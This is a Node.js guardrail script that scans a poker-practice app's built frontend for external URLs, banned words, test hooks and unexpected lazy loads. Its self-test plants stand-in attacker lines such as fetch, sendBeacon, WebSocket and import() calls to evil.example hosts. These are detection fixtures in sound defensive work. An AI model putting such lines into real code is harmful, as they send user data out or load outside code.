#!/usr/bin/env node
// scan-dist.mjs — release-artifact guardrail scan, first version (I-24; ADR-0012 scope S1-S7 + S8 from the W5 R0 lead
// review M1 + S9 from lead review 2 R0-L12; SS2/SS3/SS28/US45).
//
//   node frontend/scripts/scan-dist.mjs              scan frontend/dist + the en/ja dictionaries; exit 1 on any hit
//   node frontend/scripts/scan-dist.mjs --ko         same, for a VITE_FEATURE_KO=true build (S4 off)
//   node frontend/scripts/scan-dist.mjs --e2e        same, for a VITE_E2E=true build (S7 off)
//   node frontend/scripts/scan-dist.mjs --self-test  plant violations in a temp dir; exit 0 only if every planted case
//                                                    is caught by its rule and a clean sample passes
//
// Relaxations come from explicit arguments only, never from the environment: a CI step that scans the release build
// must not turn S4/S7 off because VITE_* happens to be set in its shell (review m7).
//
// Inputs: text files under dist (.html .js .css .json .xml .txt .svg .webmanifest; data: URIs blanked first, binaries
// skipped) and the i18n dictionaries src/app/i18n/{en,ja}.ts, imported directly (Node strips their erasable types —
// that is why those two files have no imports).
// Rules (lists and reasoned allow-lists live in scan-allow.json):
//   S1 dormant/scripted markers and old route literals      dist (markers include the session fake client: a
//                                                           release build never contains createFakeClient)
//   S2 third-party hotlinks                                 dist
//   S3 external URLs: http(s) and ws(s), any letter case,  dist (JSON-style escaped slashes `https:\/\/` are
//      same origin as an allow entry (and inside its       unescaped first)
//      path, if it has one); protocol-relative `//host` in
//      attributes, url(), JSX props and JS strings (fetch,
//      import, sendBeacon, src) is never allowed
//   S4 Hangul syllables, unless --ko                        dist
//   S5 currency symbol next to a digit                      i18n values + HTML text (bundle JS excluded: regex `$1`)
//   S6 banned words (contextual: disclosure keys only)      i18n values + HTML text
//   S7 E2E hook names, unless --e2e                         dist
//   S8 no Worker / WebSocket / RTCPeerConnection in the     dist: the module scripts of each HTML file and their
//      code that runs before the gate (SS2 rule 3)          static imports (dynamic import() chunks are excluded)
//   S9 offline practice flow: every dynamic import() and    dist: everything reachable from app.html, static and
//      Worker script reachable from the app is either       dynamic edges followed; names come from the Vite
//      preloaded by the shell warm-up or declared       output `[name]-[hash8].js`. A preload entry that no
//      outside the practice flow (scan-allow practice_flow) longer matches a reachable chunk is a finding too, and
//                                                           so is a computed import() without a listed signature
// The final version (landing, SEO rules) is 5-3's.
import { mkdtempSync, mkdirSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FRONTEND = path.resolve(HERE, '..');
const TEXT_EXT = new Set(['.html', '.js', '.css', '.json', '.xml', '.txt', '.svg', '.webmanifest']);
const HANGUL = /[\uAC00-\uD7A3]/g;

export function loadRules(file = path.join(HERE, 'scan-allow.json')) {
  return JSON.parse(readFileSync(file, 'utf8'));
}

const escapeRe = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const latin = (w) => /^[\x20-\x7e]+$/.test(w);
/** Latin words match on word boundaries, case-insensitively; Japanese words match as substrings. */
function wordRe(word) {
  return latin(word) ? new RegExp(`(?<![A-Za-z0-9])${escapeRe(word)}(?![A-Za-z0-9])`, 'gi') : new RegExp(escapeRe(word), 'g');
}

function walk(dir, out = []) {
  for (const name of readdirSync(dir)) {
    const p = path.join(dir, name);
    if (statSync(p).isDirectory()) walk(p, out);
    else if (TEXT_EXT.has(path.extname(name).toLowerCase())) out.push(p);
  }
  return out;
}

/** Visible text of an HTML document: scripts, styles and tags removed, entities for quotes decoded. */
export function htmlText(html) {
  return html
    .replace(/<!--[\s\S]*?-->/g, ' ')
    .replace(/<(script|style)[\s\S]*?<\/\1>/gi, ' ')
    .replace(/<[^>]+>/g, ' ')
    .replace(/&#39;|&apos;/g, "'")
    .replace(/&quot;/g, '"')
    .replace(/&amp;/g, '&')
    .replace(/\s+/g, ' ');
}

/**
 * S3: an absolute URL is allowed when its origin equals an allow entry's origin and, if the entry has a path, the URL
 * stays inside that path (segment boundary). Exact origins stop look-alikes such as checkypoker.pages.dev.evil.example
 * or localhost.evil.example, which a plain string prefix let through. Unparseable URLs are not allowed.
 */
export function allowedUrl(raw, allowList) {
  let url;
  try {
    url = new URL(raw);
  } catch {
    return false;
  }
  return allowList.some(({ prefix }) => {
    const allow = new URL(prefix);
    if (url.origin !== allow.origin) return false;
    const base = allow.pathname;
    return base === '/' || url.pathname === base || url.pathname.startsWith(base.endsWith('/') ? base : `${base}/`);
  });
}

// Absolute URLs S3 checks against the allow list: web and socket schemes in any letter case (a relay or TURN URL
// is wss://; `new URL()` lower-cases scheme and host before the origin comparison).
const ABSOLUTE_URL = /\b(?:https?|wss?):\/\/[^\s"'`)<>\\]+/gi;

// Protocol-relative references (`//host/x`) in HTML attributes, compiled JSX props, CSS url() and JS strings: the page
// origin never needs them (own files are root-relative), so any is an external reference S3 must not wave through. A
// JS string counts when it starts with `//` and a dotted host (fetch("//h.x/t"), import("//h.x/m.js"),
// sendBeacon('//h.x/b')) — a bare "//" (URL parsing code) or "//#" is not a host.
const PROTOCOL_RELATIVE = [
  /\b(?:src|href|action|formaction|poster|data|srcset)\s*=\s*["']?\s*\/\/(?=[^\s/"'>])/gi,
  /\b(?:src|href|action|formAction|poster|srcSet)\s*:\s*["'`]\/\/(?=[^\s/"'`])/g,
  /url\(\s*["']?\/\/(?=[^\s/"')])/gi,
  /["'`]\/\/(?=(?:[a-z0-9-]+\.)+[a-z0-9-]+(?::\d+)?(?:[/?#"'`]))/gi,
];

const PRE_GATE_APIS = [/\bnew\s+Worker\b/g, /\bWebSocket\b/g, /\bRTCPeerConnection\b/g];

/** Dist-relative paths of the chunks that run before the gate: module scripts and modulepreloads of every HTML file. */
function htmlEntryChunks(html) {
  const out = [];
  for (const m of html.matchAll(/<script\b[^>]*\btype=["']module["'][^>]*\bsrc=["']\/([^"']+\.js)["']/gi)) out.push(m[1]);
  for (const m of html.matchAll(/<script\b[^>]*\bsrc=["']\/([^"']+\.js)["'][^>]*\btype=["']module["']/gi)) out.push(m[1]);
  for (const m of html.matchAll(/<link\b[^>]*\brel=["']modulepreload["'][^>]*\bhref=["']\/([^"']+\.js)["']/gi)) out.push(m[1]);
  return out;
}

/** Static `import ... from "./x.js"` / `import "./x.js"` / `export ... from` targets; `import("./x.js")` is not one. */
function staticImports(js) {
  return [...js.matchAll(/\b(?:import|export)\s*(?:[\w$*{}\s,]+?\s*from\s*)?["'](\.{1,2}\/[^"']+?\.js)["']/g)].map((m) => m[1]);
}

/** S8 over `files` (dist-relative path -> text): everything reachable from an HTML entry through static imports. */
export function scanPreGate(files) {
  const out = [];
  const seen = new Set();
  const queue = [];
  for (const [name, text] of files) if (name.endsWith('.html')) queue.push(...htmlEntryChunks(text));
  while (queue.length > 0) {
    const name = path.posix.normalize(queue.shift());
    if (seen.has(name) || !files.has(name)) continue;
    seen.add(name);
    const js = files.get(name);
    for (const re of PRE_GATE_APIS) findAll(re, js, 'S8', name, out);
    for (const dep of staticImports(js)) queue.push(path.posix.join(path.posix.dirname(name), dep));
  }
  return out;
}

/** Vite chunk name of a dist file: `assets/metrics.worker-DMX0OOAG.js` -> `metrics.worker` (default 8-char hash). */
export function chunkName(file) {
  return path.posix.basename(file).replace(/-[\w-]{8}\.js$/, '');
}

/**
 * The lazy loads of one chunk: `import("./x.js")` and `new Worker(new URL("x.js", import.meta.url))` targets as
 * dist-relative paths, plus the offset of any import() whose specifier is computed (it cannot be checked, so it is a
 * finding of its own).
 */
function lazyLoads(name, js) {
  const dir = path.posix.dirname(name);
  const resolve = (spec) => (spec.startsWith('/') ? spec.slice(1) : path.posix.normalize(path.posix.join(dir, spec)));
  const loads = [];
  for (const m of js.matchAll(/\bimport\(\s*["'`]([^"'`]+?\.js)["'`]\s*\)/g)) loads.push({ target: resolve(m[1]), at: m.index });
  for (const m of js.matchAll(/\bnew\s+(?:Shared)?Worker\(\s*(?:""\s*\+\s*)?new\s+URL\(\s*["'`]([^"'`]+?\.js)["'`]/g)) loads.push({ target: resolve(m[1]), at: m.index });
  const computed = [...js.matchAll(/\bimport\(\s*(?!["'`])/g)].map((m) => m.index);
  return { loads, computed };
}

/**
 * S9 (lead review 2 R0-L12, review 3 R0-L29): once the shell warm-up has run after the gate, the practice flow —
 * Practice -> "Deal me in" -> Leave, again and again — must fetch nothing, so every lazily loaded chunk the app can
 * reach must be one the warm-up loads (`flow.preloaded`) or one declared as never part of that flow (`flow.outside`,
 * with a reason). Static imports load
 * with their importer and are only followed. An import() with a computed specifier is a finding unless a listed
 * library signature (`flow.computed_imports`) follows it — today only react-router's framework-mode loader.
 * ponytail: chunks are matched by name from Vite's default `[name]-[hash].js` pattern and the two lazy-load shapes
 * Rollup emits today; re-check on a Vite/Rollup major upgrade or a custom chunkFileNames (the self-test's synthetic
 * samples would not notice a format change).
 */
export function scanPracticeFlow(files, flow) {
  const out = [];
  const entry = files.get(flow.entry);
  if (entry === undefined) return [hit('S9', flow.entry, 0, `practice flow entry ${flow.entry} is missing`)];
  const known = new Set([...flow.preloaded, ...flow.outside].map((e) => e.chunk));
  const reached = new Set();
  const seen = new Set();
  const queue = htmlEntryChunks(entry);
  while (queue.length > 0) {
    const name = path.posix.normalize(queue.shift());
    if (seen.has(name) || !files.has(name)) continue;
    seen.add(name);
    const js = files.get(name);
    for (const dep of staticImports(js)) queue.push(path.posix.join(path.posix.dirname(name), dep));
    const { loads, computed } = lazyLoads(name, js);
    // A computed specifier cannot be checked; one is accepted only next to a listed library signature (300 chars).
    for (const at of computed) if (!flow.computed_imports.some((c) => js.slice(at, at + 300).includes(c.near))) out.push(hit('S9', name, at, js));
    for (const { target, at } of loads) {
      reached.add(chunkName(target));
      if (!known.has(chunkName(target))) out.push(hit('S9', name, at, js));
      queue.push(target);
    }
  }
  for (const { chunk } of flow.preloaded) {
    if (!reached.has(chunk)) out.push(hit('S9', flow.entry, 0, `preload entry "${chunk}" matches no chunk reachable from ${flow.entry}`));
  }
  return out;
}

function hit(rule, where, offset, text) {
  const start = Math.max(0, offset - 30);
  return { rule, where, offset, snippet: text.slice(start, offset + 50).replace(/\s+/g, ' ') };
}

function findAll(re, text, rule, where, out) {
  re.lastIndex = 0;
  for (const m of text.matchAll(re.global ? re : new RegExp(re.source, `${re.flags}g`))) out.push(hit(rule, where, m.index, text));
}

/** Scans one dist text file (S1, S2, S3, S4, S7 and, for HTML, S5/S6 on the visible text). */
export function scanFile(name, raw, rules, opts) {
  const out = [];
  const text = raw.replace(/data:[^"')\s]+/g, 'data:');
  for (const m of rules.dormant_markers) findAll(new RegExp(escapeRe(m), 'g'), text, 'S1', name, out);
  for (const r of rules.dormant_routes) findAll(new RegExp(`["'\`]${escapeRe(r)}["'\`]`, 'g'), text, 'S1', name, out);
  for (const h of rules.hotlinks) findAll(new RegExp(escapeRe(h), 'gi'), text, 'S2', name, out);
  // `https:\/\/` is how a URL looks inside a JSON string in a bundle; read it as the URL it becomes at runtime.
  const urls = text.replace(/\\\//g, '/');
  for (const m of urls.matchAll(ABSOLUTE_URL)) {
    if (!allowedUrl(m[0], rules.external_urls)) out.push(hit('S3', name, m.index, urls));
  }
  for (const re of PROTOCOL_RELATIVE) findAll(re, urls, 'S3', name, out);
  if (!opts.ko) findAll(HANGUL, text, 'S4', name, out);
  if (!opts.e2e) for (const n of rules.e2e_names) findAll(new RegExp(escapeRe(n), 'g'), text, 'S7', name, out);
  if (name.endsWith('.html')) out.push(...scanWords(htmlText(text), rules, name, rules.disclosure_only.html_sentences.map((s) => s.text)));
  return out;
}

/** S5 + S6 on one piece of user-facing text. `allowedSentences` are removed first (contextual disclosure rule). */
export function scanWords(text, rules, where, allowedSentences = []) {
  const out = [];
  findAll(new RegExp(rules.currency, 'g'), text, 'S5', where, out);
  for (const w of rules.banned_everywhere) findAll(wordRe(w), text, 'S6', where, out);
  findAll(new RegExp(rules.banned_store, 'gi'), text, 'S6', where, out);
  findAll(new RegExp(rules.banned_pro, 'g'), text, 'S6', where, out);
  let rest = text;
  for (const s of allowedSentences) rest = rest.split(s).join(' ');
  for (const w of rules.disclosure_only.words) findAll(wordRe(w), rest, 'S6', where, out);
  return out;
}

/** S5 + S6 over a dictionary; disclosure-only words are allowed in the listed G-2 keys only. */
export function scanDictionary(lang, dict, rules) {
  const out = [];
  for (const [key, value] of Object.entries(dict)) {
    const allowed = rules.disclosure_only.keys.includes(key) ? [value] : [];
    out.push(...scanWords(value, rules, `${lang}:${key}`, allowed));
  }
  return out;
}

export async function scan({ dist, i18nDir, rules = loadRules(), ko = false, e2e = false }) {
  const findings = [];
  // Dist-relative POSIX paths, so S8 can follow `./x.js` imports the way the browser resolves them.
  const files = new Map(walk(dist).map((file) => [path.relative(dist, file).split(path.sep).join('/'), readFileSync(file, 'utf8')]));
  for (const [name, text] of files) findings.push(...scanFile(name, text, rules, { ko, e2e }));
  findings.push(...scanPreGate(files));
  findings.push(...scanPracticeFlow(files, rules.practice_flow));
  for (const lang of ['en', 'ja']) {
    const mod = await import(pathToFileURL(path.join(i18nDir, `${lang}.ts`)).href);
    findings.push(...scanDictionary(lang, mod[lang], rules));
  }
  return findings;
}

function report(findings) {
  const rules = ['S1', 'S2', 'S3', 'S4', 'S5', 'S6', 'S7', 'S8', 'S9'];
  for (const r of rules) {
    const list = findings.filter((f) => f.rule === r);
    console.log(`${r}: ${list.length} violation(s)`);
    for (const f of list.slice(0, 5)) console.log(`  ${f.where} @${f.offset}: ${f.snippet}`);
  }
}

/** Scan relaxations, from explicit arguments only (see the header). */
export function scanOptions(argv) {
  return { ko: argv.includes('--ko'), e2e: argv.includes('--e2e') };
}

async function selfTest() {
  const rules = loadRules();
  const dir = mkdtempSync(path.join(tmpdir(), 'scan-dist-self-'));
  try {
    const dist = path.join(dir, 'dist');
    const i18n = path.join(dir, 'i18n');
    mkdirSync(path.join(dist, 'assets'), { recursive: true });
    mkdirSync(i18n);
    // Each case must be reported by its rule at its file.
    const cases = [
      ['S1', 'assets/s1.js', 'const label = "Dummy Missions"; navigate("/store");'],
      ['S1', 'assets/s1-fake.js', 'throw new Error(`createFakeClient: unknown scenario ${s}`)'],
      ['S2', 'assets/s2.css', '.bg{background:url(https://www.transparenttextures.com/patterns/carbon.png)}'],
      ['S3', 'assets/s3.js', 'fetch("https://evil.example.com/track")'],
      ['S3', 'assets/s3-lookalike.js', 'fetch("https://checkypoker.pages.dev.evil.example/x");fetch("http://localhost.evil.example/y")'],
      ['S3', 'assets/s3-path.js', 'location.href="https://github.com/Danto7632/checky-poker-evil"'],
      ['S3', 's3-relative.html', '<script src="//cdn.example/x.js"></script>'],
      ['S3', 'assets/s3-relative.css', '.a{background:url(//cdn.example/a.png)}'],
      ['S3', 'assets/s3-jsx.js', 'e("img",{src:"//cdn.example/a.png"})'],
      // R0-L22 (re-review N-2): socket schemes, any letter case, JS-string `//host`, escaped slashes.
      ['S3', 'assets/s3-wss.js', 'const s=new WebSocket("wss://relay.evil.example/room")'],
      ['S3', 'assets/s3-ws-upper.js', 'const s=new WebSocket("WS://relay.evil.example:8080")'],
      ['S3', 'assets/s3-https-upper.js', 'fetch("HTTPS://EVIL.EXAMPLE/track")'],
      ['S3', 'assets/s3-http-mixed.js', "fetch('Http://evil.example/t')"],
      ['S3', 'assets/s3-fetch-relative.js', 'fetch("//evil.example/t")'],
      ['S3', 'assets/s3-import-relative.js', 'const m=()=>import("//evil.example/mod.js")'],
      ['S3', 'assets/s3-beacon-relative.js', "navigator.sendBeacon('//evil.example/b',d)"],
      ['S3', 'assets/s3-src-relative.js', 'i.src="//evil.example/p.gif"'],
      ['S3', 'assets/s3-escaped.js', 'navigator.sendBeacon("https:\\/\\/evil.example/b",d)'],
      ['S3', 'assets/s3-escaped-relative.js', 'fetch("\\/\\/evil.example/t")'],
      ['S4', 'assets/s4.js', 'const name = "\uD55C\uAD6D\uC5B4";'],
      ['S5', 's5.html', '<p>Win $100 today</p>'],
      ['S6', 's6.html', '<p>Buy chips in our store</p>'],
      ['S7', 'assets/s7.js', 'window.__CHECKY_E2E__ = {}'],
      // S8: s8.html -> s8-entry.js (module script) -> s8-dep.js (static import) opens a relay socket before the gate.
      ['S8', 'assets/s8-dep.js', 'export const s=new WebSocket("wss://relay.example")'],
      ['S8', 'assets/s8-entry.js', 'import{s}from"./s8-dep.js";const w=new Worker(new URL("./w.js",import.meta.url))'],
      // S9: app.html -> app chunk lazily imports a table piece the warm-up does not load, and computes a specifier;
      // the practice chunk spawns a Worker script that is not prewarmed.
      ['S9', 'assets/app-AAAAAAAA.js', 'const p=()=>import("./PracticeScreen-BBBBBBBB.js"),s=()=>import("./BetSizer-CCCCCCCC.js")'],
      ['S9', 'assets/app-computed-AAAAAAAA.js', 'const k=n=>import(n)'],
      ['S9', 'assets/PracticeScreen-BBBBBBBB.js', 'import"./app-AAAAAAAA.js";new Worker(new URL("/assets/sound-DDDDDDDD.js",import.meta.url),{type:"module"})'],
    ];
    writeFileSync(path.join(dist, 'app.html'), '<script type="module" crossorigin src="/assets/app-AAAAAAAA.js"></script><script type="module" src="/assets/app-computed-AAAAAAAA.js"></script>');
    writeFileSync(path.join(dist, 's8.html'), '<script type="module" crossorigin src="/assets/s8-entry.js"></script>');
    for (const [, file, body] of cases) writeFileSync(path.join(dist, file), body);
    // Clean dictionaries plus one dictionary-only violation per text rule.
    writeFileSync(path.join(i18n, 'en.ts'), "export const en = { 'gate.item.chips': \"Chips have no cash value and can't be bought.\", 'x.bad': 'Get 100\u20AC', 'y.bad': 'cash prize' };\n");
    writeFileSync(path.join(i18n, 'ja.ts'), "export const ja = { 'a.ok': '\u904A\u3073\u7528\u30C1\u30C3\u30D7' };\n");
    const findings = await scan({ dist, i18nDir: i18n, rules });
    const missed = cases.filter(([rule, file]) => !findings.some((f) => f.rule === rule && f.where === file)).map(([rule, file]) => `${rule} ${file}`);
    const dictCurrency = findings.some((f) => f.rule === 'S5' && f.where === 'en:x.bad');
    const dictWord = findings.some((f) => f.rule === 'S6' && f.where === 'en:y.bad');
    const disclosureAllowed = !findings.some((f) => f.where === 'en:gate.item.chips');
    // The environment never relaxes a scan; only the arguments do.
    const saved = { ko: process.env.VITE_FEATURE_KO, e2e: process.env.VITE_E2E };
    process.env.VITE_FEATURE_KO = 'true';
    process.env.VITE_E2E = 'true';
    const strictByDefault = JSON.stringify(scanOptions([])) === '{"ko":false,"e2e":false}' && JSON.stringify(scanOptions(['--ko', '--e2e'])) === '{"ko":true,"e2e":true}';
    for (const [k, v] of [['VITE_FEATURE_KO', saved.ko], ['VITE_E2E', saved.e2e]]) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
    // A clean tree must pass with zero findings: allowed origins and paths, a module entry whose Worker lives in a
    // dynamically imported chunk. New directories: Node caches ES modules by URL, so rewriting en.ts in place would
    // re-scan the dirty dictionary.
    const cleanDist = path.join(dir, 'clean-dist');
    const cleanI18n = path.join(dir, 'clean-i18n');
    mkdirSync(path.join(cleanDist, 'assets'), { recursive: true });
    mkdirSync(cleanI18n);
    writeFileSync(path.join(cleanDist, 'index.html'), '<p>Chips are play money with no cash value and can\'t be bought, sold or exchanged. This is not gambling. For adults 18+.</p><a href="https://github.com/Danto7632/checky-poker">x</a><a href="https://checkypoker.pages.dev/app">y</a><script type="module" src="/assets/entry.js"></script>');
    writeFileSync(path.join(cleanDist, 'assets', 'entry.js'), 'import{a}from"./shared.js";const g=()=>import("./game.js");fetch("https://reactjs.org/docs/error-decoder.html?invariant=1")');
    writeFileSync(path.join(cleanDist, 'assets', 'shared.js'), 'export const a=1;const u=new URL("x","http://localhost")');
    // Strings that look URL-ish but are not external references: bare "//" (URL parsing), an allowed origin in upper
    // case and escaped, a root-relative path. The socket opens on a computed URL (2-x relay), not a literal.
    writeFileSync(path.join(cleanDist, 'assets', 'game.js'), 'new Worker(new URL("./w.js",import.meta.url));new WebSocket(relayUrl);u.startsWith("//")||u.split("//");const h="HTTPS://CHECKYPOKER.PAGES.DEV/app",e="https:\\/\\/checkypoker.pages.dev\\/join",r="/assets/x.js"');
    writeFileSync(path.join(cleanI18n, 'en.ts'), "export const en = { 'a': 'Pot 1,200' };\n");
    writeFileSync(path.join(cleanI18n, 'ja.ts'), "export const ja = { 'a': '\u30dd\u30c3\u30c8 1,200' };\n");
    // The practice flow as the real build emits it: app.html -> app chunk -> lazy PracticeScreen, game-services and
    // the ko stub; game-services spawns the two prewarmed Workers.
    writeFileSync(path.join(cleanDist, 'app.html'), '<script type="module" crossorigin src="/assets/app-AAAAAAAA.js"></script>');
    // react-router's framework-mode loader, minified as the real build emits it: listed in computed_imports.
    writeFileSync(path.join(cleanDist, 'assets', 'app-AAAAAAAA.js'), 'const p=()=>import("./PracticeScreen-BBBBBBBB.js"),g=()=>import("./game-services-CCCCCCCC.js"),k=()=>import("./_checky-i18n-off-DDDDDDDD.js");async function X(n,r){try{let i=await import(n.module);return i}catch(i){return console.error(`Error loading route module \\`${n.module}\\`, reloading page...`)}}');
    writeFileSync(path.join(cleanDist, 'assets', 'PracticeScreen-BBBBBBBB.js'), 'import{a}from"./app-AAAAAAAA.js";');
    writeFileSync(path.join(cleanDist, 'assets', 'game-services-CCCCCCCC.js'), 'import"./app-AAAAAAAA.js";new Worker(new URL("/assets/worker-EEEEEEEE.js",import.meta.url),{type:"module"});new Worker(new URL("/assets/metrics.worker-FFFFFFFF.js",import.meta.url))');
    writeFileSync(path.join(cleanDist, 'assets', '_checky-i18n-off-DDDDDDDD.js'), 'export const ko={};');
    writeFileSync(path.join(cleanDist, 'assets', 'worker-EEEEEEEE.js'), 'self.onmessage=()=>{}');
    writeFileSync(path.join(cleanDist, 'assets', 'metrics.worker-FFFFFFFF.js'), 'self.onmessage=()=>{}');
    const clean = await scan({ dist: cleanDist, i18nDir: cleanI18n, rules });
    // A stale preload entry (no reachable chunk by that name) is reported at the entry.
    const staleFlow = { ...rules.practice_flow, preloaded: [...rules.practice_flow.preloaded, { chunk: 'gone', how: 'self-test' }] };
    const cleanFiles = new Map(walk(cleanDist).map((file) => [path.relative(cleanDist, file).split(path.sep).join('/'), readFileSync(file, 'utf8')]));
    const staleCaught = scanPracticeFlow(cleanFiles, staleFlow).some((f) => f.rule === 'S9' && f.where === 'app.html');
    const ok = missed.length === 0 && dictCurrency && dictWord && disclosureAllowed && strictByDefault && staleCaught && clean.length === 0;
    console.log(`self-test: cases caught ${cases.length - missed.length}/${cases.length} (S1-S9)${missed.length ? ` (missed ${missed.join(', ')})` : ''}; dictionary S5 ${dictCurrency}, S6 ${dictWord}; disclosure key allowed ${disclosureAllowed}; env does not relax ${strictByDefault}; stale preload entry caught ${staleCaught}; clean sample findings ${clean.length}`);
    for (const f of clean) console.log(`  clean finding ${f.rule} ${f.where}: ${f.snippet}`);
    console.log(ok ? 'self-test: PASS' : 'self-test: FAIL');
    return ok ? 0 : 1;
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

async function main() {
  if (process.argv.includes('--self-test')) process.exit(await selfTest());
  const dist = path.join(FRONTEND, 'dist');
  const findings = await scan({ dist, i18nDir: path.join(FRONTEND, 'src', 'app', 'i18n'), ...scanOptions(process.argv.slice(2)) });
  report(findings);
  console.log(findings.length === 0 ? 'scan-dist: OK (0 violations)' : `scan-dist: FAIL (${findings.length} violations)`);
  process.exit(findings.length === 0 ? 0 : 1);
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) await main();
